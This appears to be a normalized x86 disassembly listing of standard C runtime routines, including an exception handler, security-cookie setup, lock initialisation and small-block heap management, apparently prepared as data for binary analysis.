push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_1002fe60
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10027150
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10027150
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_10033764
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_1003371a
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10027150
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10027150
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_1003374a
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_10033764
mov eax [ ebp + 0xc ]
push r--data
call sub_10034760
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10027150
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_10033731
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10027150
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_1002ffec
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_10030082
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_10034ae2
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_1003013b
push 0xc
push r--data
call sub_1002fdfc
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_10031d49
push 0x1e
call sub_10031b9e
push 0xff
call sub_1002abcf
push 0x18
call sub_1002ddb0
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_1002d4db
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_1002fe41
retn
push edi
call sub_10027a85
pop ecx
push 0xfa0
push edi
call sub_10034ae2
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_10027a85
pop ecx
call sub_1002d4db
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100301f5
mov eax [ ebp - 0x1c ]
sub_100301fe
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_1003013b
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1002ab7b
pop ecx
sub_10030231
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_10030261
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_1002e960
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_10030577
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_10030627
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_1003072f
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_10030a10
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_10030627
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_10030577
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
